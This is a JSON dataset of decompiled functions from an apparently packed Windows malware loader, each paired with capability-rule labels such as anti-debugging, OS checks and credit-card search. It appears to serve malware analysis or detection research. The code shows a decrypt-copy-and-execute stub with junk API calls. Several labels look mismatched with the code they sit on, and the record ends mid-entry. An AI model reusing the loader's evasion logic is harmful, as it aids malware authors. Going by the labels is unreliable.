{
    "00404e0b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00404e0b(void)\n\n{\n    *0x5cb4f9 = 0x6c;\n    *0x5cb4f3 = 0x6d;\n    *0x5cb4f2 = 0x69;\n    *0x5cb4f4 = 0x67;\n    *0x5cb4f8 = 100;\n    *0x5cb4fb = 0;\n    *0x5cb4f5 = 0x33;\n    *0x5cb4f1 = 0x73;\n    *0x5cb4fa = 0x6c;\n    *0x5cb4f7 = 0x2e;\n    *0x5cb4f6 = 0x32;\n    *0x5cb4f0 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x5cb4f0);\n    return;\n}\n",
        "token_count": 218
    },
    "00404e75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.00404e75(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *unaff_EBX;\n    uint32_t uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = *0x41b4cc;\n    iVar1 = *0x41b4c8;\n    var_8h = *unaff_EBX;\n    uVar4 = unaff_EBX[1];\n    fcn.00404e6b();\n    iVar3 = *0x41b4d0;\n    var_18h = 0x23f;\n    var_20h = 0x20;\n    do {\n        if (*0x5cc7bc == 0xfa9) {\n            *0x5cc61c = 0xedeb2e40;\n        }\n        if (*0x5cc7bc == 0x3eb) {\n            *0x5cc584 = 0;\n        }\n        *0x5cc618 = 0xf4ea3dee;\n        fcn.00404e72();\n        if (*0x5cc7bc == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        }\n        if (*0x5cc7bc == 0x213) {\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(0x40481c, 0);\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectW)(0, 0, 0x404838);\n            (*_sym.imp.KERNEL32.dll_CreateHardLinkA)(0x404888, 0x404868, 0);\n            (*_sym.imp.KERNEL32.dll_GetFullPathNameW)(0, 0, 0, 0);\n        }\n        uVar4 = uVar4 - (var_8h >> 5 ^ var_8h * 0x10 + iVar3 ^ var_8h + var_18h);\n        *0x5cb524 = 0;\n        var_8h = var_8h - (uVar4 * 0x10 + iVar1 ^ var_18h + uVar4 ^ (uVar4 >> 5) + iVar2);\n        var_18h = var_18h + 0x61c88647;\n        var_20h = var_20h + -1;\n    } while (var_20h != 0);\n    unaff_EBX[1] = uVar4;\n    *unaff_EBX = var_8h;\n    return;\n}\n",
        "token_count": 653
    },
    "00404fed": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00404fed(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint lpDestStr;\n    uint var_41ch;\n    uint var_1ch;\n    uint lpNumberOfCharsWritten;\n    uint lpFileSizeHigh;\n    uint var_10h;\n    uint32_t var_ch;\n    uint dwWriteCoord;\n    int32_t var_4h;\n    \n    var_ch = *0x5cc7bc >> 3;\n    if (var_ch != 0) {\n        var_4h = *0x5cc588;\n        do {\n            if (*0x5cc7bc == 0x959) {\n                (*_sym.imp.KERNEL32.dll_GetProcessWorkingSetSize)(0, 0, 0);\n                dwWriteCoord = 0;\n                (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)(0, 0, 0, 0, &lpNumberOfCharsWritten);\n                pcVar2 = _sym.imp.KERNEL32.dll_WriteConsoleA;\n                (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, &var_10h, 0);\n                (*_sym.imp.KERNEL32.dll_LCMapStringW)(0, 0, 0, 0, &lpDestStr, 0);\n                pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n                (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4048a0);\n                (*pcVar1)(0x4048c4);\n                (*pcVar2)(0, 0, 0, &var_1ch, 0);\n                (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)(&var_41ch, 0, 0);\n                (*_sym.imp.KERNEL32.dll_GetFileSize)(0, &lpFileSizeHigh);\n            }\n            fcn.00404e75();\n            var_4h = var_4h + 8;\n            var_ch = var_ch - 1;\n        } while (var_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "0040517f": {
        "rules": [
            "search for credit card data/ac143e9ae29c414184a69c9308e24693",
            "parse credit card information/f44d27b3cce043409e5315cf54d1899b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfCharsWritten\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: dwWriteCoord\n// WARNING: Variable defined which should be unmapped: lpValue\n\nvoid fcn.0040517f(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpCalData;\n    uint var_1120h;\n    uint lpBuffer;\n    uint var_920h;\n    uint lpCPInfoEx;\n    uint lpszVolumePathName;\n    uint lpCriticalSection;\n    uint lpCPInfo;\n    uint var_114h;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint *var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint *var_78h;\n    uint *var_74h;\n    uint *var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint lpNumberOfCharsWritten;\n    uint lpValue;\n    uint dwWriteCoord;\n    int32_t var_4h;\n    \n    var_4h = 0x40518c;\n    fcn.00411ea0();\n    lpValue = unaff_EDI;\n    dwWriteCoord = unaff_ESI;\n    var_4h = unaff_EBX;\n    if (*0x5cc7bc == 0x412) {\n        lpNumberOfCharsWritten = 0x4051a6;\n        fcn.0040654c();\n        lpNumberOfCharsWritten = 0x4051b1;\n        fcn.0040660d();\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x4051b9;\n        fcn.00406d83(0);\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x4051c0;\n        fcn.00406d99();\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0;\n        var_18h = 0x4051c8;\n        fcn.00406b76(0, 0);\n        lpNumberOfCharsWritten = 0;\n        var_14h = 0x4051d0;\n        fcn.0040755a(0);\n    }\n    *0x5cc7bc = *0x5cc7bc + 0xb2d3b;\n    var_14h = 0x4048ec;\n    var_18h = 0x4051e5;\n    *0x5cc58c = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n    var_18h = *0x5cc7bc;\n    var_1ch = 0;\n    var_20h = 0x4051f9;\n    *0x5cc588 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    var_20h = 0x405203;\n    fcn.004050d5();\n    uVar2 = 0;\n    if (*0x5cc7bc != 0) {\n        do {\n            (*0x5cc588)[uVar2] = *(*0x5cc7c0 + 0xb2d3b + uVar2);\n            if (*0x5cc7bc == 0x292) {\n                var_20h = 0x404908;\n                var_24h = NULL;\n                var_28h = 0x40523a;\n                (*_sym.imp.KERNEL32.dll_CreateJobObjectW)();\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x5cc7bc);\n    }\n    iVar3 = 0;\n    do {\n        if (*0x5cc7bc + iVar3 == 0x5e) {\n            var_20h = NULL;\n            var_24h = 0x40495c;\n            var_28h = 0x40525d;\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesA)();\n            var_28h = 0;\n            var_2ch = 0x404980;\n            var_30h = 0x404a28;\n            var_34h = 0x40526e;\n            (*_sym.imp.KERNEL32.dll_GetProfileIntW)();\n            var_34h = &fcn.0040517f::lpCPInfo;\n            var_38h = 0;\n            var_3ch = 0x40527c;\n            (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n            var_3ch = NULL;\n            var_40h = 0;\n            var_44h = 0x405284;\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)();\n            var_44h = NULL;\n            var_48h = &fcn.0040517f::var_920h;\n            var_4ch = &fcn.0040517f::dwWriteCoord;\n            var_50h = &fcn.0040517f::var_4h;\n            var_54h = &fcn.0040517f::lpNumberOfCharsWritten;\n            var_58h = NULL;\n            var_5ch = &fcn.0040517f::lpszVolumePathName;\n            var_60h = 0x404a78;\n            var_64h = 0x4052ab;\n            (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)();\n            var_64h = 0x404a8c;\n            var_68h = 0;\n            var_6ch = 0;\n            var_70h = 0x4052b8;\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectW)();\n            var_70h = &fcn.0040517f::lpValue;\n            var_74h = NULL;\n            var_78h = &fcn.0040517f::lpCalData;\n            var_7ch = 0;\n            var_80h = 0;\n            var_84h = 0;\n            var_88h = 0x4052cd;\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoW)();\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x40c893);\n    iVar3 = 0;\n    do {\n        var_20h = 0x4052e2;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 < 0x1b92e51) {\n            var_3ch = 0x4610f018;\n            var_f0h = 0xeaf5fe12;\n            var_c4h = 0x6e6024ec;\n            var_a0h = 0xe5ddf081;\n            var_54h = 0x60c24301;\n            var_98h = 0xf11699c6;\n            var_9ch = 0x5447e6cd;\n            var_a4h = 0xf7f9bc7a;\n            var_ach = 0xe40a86e5;\n            var_d0h = 0xba9260d4;\n            var_e8h = 0x28677973;\n            var_64h = 0x22568126;\n            var_8ch = 0x7fa22f5c;\n            var_108h = 0x1836c344;\n            var_bch = 0x3f3bd8f9;\n            var_58h = 0xad0e06c1;\n            var_f4h = 0x946a0ac2;\n            var_94h = 0xd30b5288;\n            var_18h = 0xb4ec71c;\n            var_f8h = 0xee20648;\n            var_ech = 0x16e008c9;\n            var_4ch = 0x4f9aa4b4;\n            var_34h = 0xfb6ee96c;\n            var_74h = 0x157a7ce7;\n            var_e0h = 0x4bbf74a5;\n            lpValue = 0x56461fc4;\n            var_60h = 0x976a7c8e;\n            var_28h = 0xc5cbd29c;\n            var_104h = 0x16495cb1;\n            var_100h = 0xd3a9ace6;\n            var_88h = 0x26e806d9;\n            var_50h = 0x898eada6;\n            var_6ch = 0x1edeebb1;\n            var_b8h = 0x10404e7d;\n            var_c8h = 0x251f8861;\n            var_68h = 0xae259a1f;\n            lpNumberOfCharsWritten = 0x28b8362c;\n            var_40h = 0xf1630d82;\n            var_d8h = 0x6b3f9590;\n            var_44h = 0x3b3e2936;\n            var_d4h = 0xb50f1b63;\n            dwWriteCoord = 0xe8e47dec;\n            var_4h = 0x9344d4a8;\n            var_a8h = 0xcbf393e7;\n            var_48h = 0x2e7b0477;\n            var_38h = 0x2361292f;\n            var_5ch = 0x2693bce5;\n            var_78h = 0x41e09b7c;\n            var_dch = 0x887fe3d7;\n            var_80h = 0x21775d98;\n            var_70h = 0xa3e05920;\n            var_b0h = 0x5fb64cf4;\n            var_cch = 0x2f4d07f0;\n            var_1ch = 0x13c32aee;\n            var_2ch = 0x21d5b70a;\n            var_e4h = 0x675793c9;\n            var_14h = 0xc3a50564;\n            var_7ch = 0x79cd39fd;\n            var_fch = 0x5d309f77;\n            var_30h = 0xc96a4ef3;\n            var_c0h = 0xe0537d5f;\n            var_b4h = 0xfa80f583;\n            var_84h = 0xbd51bf5f;\n            var_90h = 0xffe8cb61;\n            var_24h = 0xd65999e2;\n        }\n        var_20h = 0x405c61;\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultLCID)();\n    } while ((iVar3 < 0x1b3afd6) && (iVar3 = iVar3 + 1,  iVar3 < 0x1715fa10));\n    var_20h = 0x405c7b;\n    fcn.00404fed();\n    iVar3 = 0;\n    do {\n        if (iVar3 == 0x770e) {\n            var_20h = 0x405c8a;\n            fcn.004050bb();\n            iVar3 = extraout_ECX;\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x286b97d);\n    iVar3 = 0x7b;\n    do {\n        if (*0x5cc7bc == 0x86) {\n            var_20h = &fcn.0040517f::lpszVolumePathName;\n            var_24h = NULL;\n            var_28h = 0x404aa0;\n            var_2ch = 0x405cb5;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_4h = 0x184cc;\n    do {\n        if (*0x5cc7bc == 0x1833b) {\n            var_20h = NULL;\n            var_24h = &fcn.0040517f::lpszVolumePathName;\n            var_28h = 0x404ac8;\n            var_2ch = 0x405ce8;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNameA)();\n            var_2ch = 0;\n            var_30h = 0x405cef;\n            (*_sym.imp.KERNEL32.dll_FindNextChangeNotification)();\n            var_30h = 0;\n            var_34h = &fcn.0040517f::lpCriticalSection;\n            var_38h = 0x405cfd;\n            (*_sym.imp.KERNEL32.dll_SetCriticalSectionSpinCount)();\n            var_38h = 0;\n            var_3ch = &fcn.0040517f::lpNumberOfCharsWritten;\n            var_40h = 0;\n            var_44h = &fcn.0040517f::lpBuffer;\n            var_48h = NULL;\n            var_4ch = 0x405d11;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)();\n            var_4ch = 0x404b48;\n            var_50h = 0x405d18;\n            (*pcVar1)();\n            var_50h = NULL;\n            var_54h = NULL;\n            var_58h = 0x405d20;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            var_58h = &fcn.0040517f::lpCPInfoEx;\n            var_5ch = NULL;\n            var_60h = 0;\n            var_64h = 0x405d2f;\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n            var_64h = 0;\n            var_68h = 0;\n            var_6ch = 0x405d37;\n            (*_sym.imp.KERNEL32.dll_TlsSetValue)();\n            var_6ch = 0;\n            var_70h = NULL;\n            var_74h = &fcn.0040517f::var_1120h;\n            var_78h = 0x405d46;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)();\n            var_78h = NULL;\n            var_7ch = 0;\n            var_80h = 0x405d4e;\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)();\n            var_80h = 0;\n            var_84h = 0x405d51;\n            (*pcVar1)();\n            var_84h = 0;\n            var_88h = 0;\n            var_8ch = 0;\n            var_90h = 0x405d5a;\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointW)();\n            dwWriteCoord = 0;\n            var_90h = &fcn.0040517f::lpValue;\n            var_94h = 0;\n            var_98h = 0;\n            var_9ch = 0;\n            var_a0h = 0;\n            var_a4h = 0x405d75;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)();\n            var_a4h = 0;\n            var_a8h = 0;\n            var_ach = 0;\n            var_b0h = 0;\n            var_b4h = 0;\n            var_b8h = 0x405d80;\n            (*_sym.imp.KERNEL32.dll_FoldStringW)();\n        }\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    var_20h = 0x405d8e;\n    fcn.00404e0b();\n    var_20h = 0x405d94;\n    (**0x5cc588)();\n    return;\n}\n",
        "token_count": 4014
    },
    "null": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar auStack56 [32];\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x4180b6;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    if (*0x5cc7bc == 0x20) {\n        (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, auStack56, 0);\n        (*_sym.imp.KERNEL32.dll_OpenJobObjectW)(0, 0, 0x404b60);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(0, 0);\n        fcn.00404db0();\n        fcn.004064c5();\n        fcn.0040677d(0);\n        fcn.00406966(0);\n        fcn.00406f6e(0x5cb4f0, 0x404bac);\n        fcn.00406f1b(0, 0x404bb4, 0x404b5c);\n        fcn.00406d27(0);\n        fcn.004071e4(0, 0, 0);\n        fcn.00404de8(0, 0);\n        fcn.0040680b(0, 0);\n        fcn.00404dc5(0, 0);\n        uStack12 = 0xffffffff;\n        fcn.004064e2();\n    }\n    iVar1 = 0xe3a7;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        (*_sym.imp.KERNEL32.dll_DisconnectNamedPipe)(0);\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x404bbc);\n    *0x5cc7bc = *0x43065c;\n    *0x5cc7c0 = *0x42f6bc;\n    fcn.0040517f();\n    *in_FS_OFFSET = uStack24;\n    return 0;\n}\n",
        "token_count": 504
    },
    "004064ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004064ea(char param_1)\n\n{\n    int32_t unaff_ESI;\n    \n    if ((param_1 != '\\0') && (7 < *(unaff_ESI + 0x18))) {\n        fcn.00406531(*(unaff_ESI + 4));\n    }\n    *(unaff_ESI + 0x18) = 7;\n    fcn.00406514();\n    return;\n}\n",
        "token_count": 96
    },
    "0040660d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040660d(uint *param_1)\n\n{\n    *param_1 = 0x401210;\n    if (param_1[2] != 0) {\n        fcn.0040677d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040742e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00407521: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00407526)\n// WARNING: Removing unreachable block (ram,0x00407554)\n// WARNING: Removing unreachable block (ram,0x0040752c)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040742e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x418258, 0x18);\n    fcn.004087ba(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x5caa74 != 1) {\n        *0x5caa70 = 1;\n        *0x5caa6c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040a6d9(*0x5cd938);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040a6d9(*0x5cd934);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040a6d0();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040a6d9(*piVar2);\n                        iVar3 = fcn.0040a6d0();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040a6d9(*0x5cd938);\n                        piVar1 = fcn.0040a6d9(*0x5cd934);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00407368(0x4011cc);\n        }\n        fcn.00407368(0x4011d4);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004086e0(8);\n    }\n    return;\n}\n",
        "token_count": 807
    },
    "0040798b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040798b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x407a36;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00407a62;\n        uStack36 = *0x41ac70 ^ &fcn.0040798b::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040798b::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040a925();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040798b::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 723
    },
    "00407c7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c7b(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41ac70) {\n        return;\n    }\n    *0x5cb1c0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x5cb1c4 = &arg_8h;\n    *0x5cb100 = 0x10001;\n    *0x5cb0a8 = 0xc0000409;\n    *0x5cb0ac = 1;\n    var_328h = *0x41ac70;\n    var_324h = *0x41ac74;\n    *0x5cb0b4 = unaff_retaddr;\n    *0x5cb18c = in_GS;\n    *0x5cb190 = in_FS;\n    *0x5cb194 = in_ES;\n    *0x5cb198 = in_DS;\n    *0x5cb19c = unaff_EDI;\n    *0x5cb1a0 = unaff_ESI;\n    *0x5cb1a4 = unaff_EBX;\n    *0x5cb1a8 = in_EDX;\n    *0x5cb1ac = in_ECX;\n    *0x5cb1b0 = in_EAX;\n    *0x5cb1b4 = unaff_EBP;\n    *0x5cb1b8 = unaff_retaddr;\n    *0x5cb1bc = in_CS;\n    *0x5cb1c8 = in_SS;\n    *0x5cb0f8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00410b5c(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401da8);\n    if (*0x5cb0f8 == 0) {\n        fcn.00410b5c(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 860
    },
    "0040f569": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040f569(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004086e0(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040fcd9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
